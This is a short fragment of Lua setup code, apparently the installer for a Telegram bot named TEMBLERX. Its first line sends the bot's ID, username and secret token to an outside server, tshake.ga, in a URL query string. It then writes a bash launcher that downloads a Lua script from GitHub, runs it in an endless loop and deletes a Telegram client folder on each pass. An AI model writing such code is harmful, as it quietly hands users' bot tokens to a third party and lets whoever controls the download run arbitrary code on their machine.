...
http.request("https://tshake.ga/TEMBLERX/TEMBLERX.php?id="..database:get(Server_Tshake.."Id_Tshake").."&UserName="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
local RunTshake = io.open("TEMBLERX", 'w')
RunTshake:write([[
#!/usr/bin/env bash
cd $HOME/TEMBLERX
token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
rm -fr TEMBLERX.lua
wget "https://raw.githubusercontent.com/TEMBLERX/TEMBLERX/master/TEMBLERX.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TEMBLERX.lua -p PROFILE --bot=$token
done
]])
RunTshake:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S TEMBLERXkill
screen -S TEMBLERX ./TEMBLERX
done
]])
RunTs:close()
end
